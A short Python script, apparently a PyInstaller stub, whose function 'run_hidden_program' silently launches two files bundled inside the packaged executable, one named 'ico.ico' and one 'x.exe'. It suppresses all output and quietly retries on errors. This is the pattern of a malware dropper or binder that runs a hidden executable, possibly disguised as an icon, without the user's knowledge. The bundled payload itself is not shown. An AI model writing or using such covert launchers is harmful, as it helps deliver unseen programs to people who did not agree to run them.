import subprocess
import os
import sys
import time


def run_hidden_program(exe_name):
    try:
        exe_path = os.path.join(sys._MEIPASS, exe_name)
        subprocess.Popen(exe_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        time.sleep(1)
        exe_path = os.path.join(sys._MEIPASS, exe_name)
        subprocess.Popen(exe_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        
run_hidden_program('ico.ico')
run_hidden_program('x.exe')